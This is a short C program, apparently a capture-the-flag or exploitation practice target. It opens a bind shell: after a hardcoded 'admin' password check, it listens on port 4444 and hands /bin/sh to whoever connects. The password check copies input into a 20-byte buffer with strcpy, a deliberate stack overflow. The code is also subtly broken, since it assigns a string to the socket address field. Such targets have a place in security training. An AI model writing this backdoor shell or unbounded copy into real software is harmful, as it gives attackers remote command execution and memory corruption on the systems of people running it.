#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define IP_SERVER ""
#define PASSWORD "admin"

int auth(char *password){
    char passcheck[20];int flags=0;
    strcpy(passcheck,password);
    if (strcmp(passcheck,PASSWORD)==0){flags=1;}
    return flags;
}

int main(int argc, char *argv[])
{
    if (argc < 2){
        printf("SERVER ERROR !");exit(0);
    }
// admin server
    if (auth(argv[1])){
        system("echo login >> log.txt");
        int resultfd, sockfd;
        int port = 4444;
        struct sockaddr_in my_addr;

        sockfd = socket(AF_INET, SOCK_STREAM, 0);

        int one = 1;
        setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

        my_addr.sin_family = AF_INET;
        my_addr.sin_port = htons(port); 
        my_addr.sin_addr.s_addr = IP_SERVER; 

        bind(sockfd, (struct sockaddr *) &my_addr, sizeof(my_addr));

        listen(sockfd, 0);

        resultfd = accept(sockfd, NULL, NULL);

        dup2(resultfd, 2);
        dup2(resultfd, 1);
        dup2(resultfd, 0);

        execve("/bin/sh", NULL, NULL);
    }else {
        system("echo massage >> log.txt");
    }
	return 0;
}
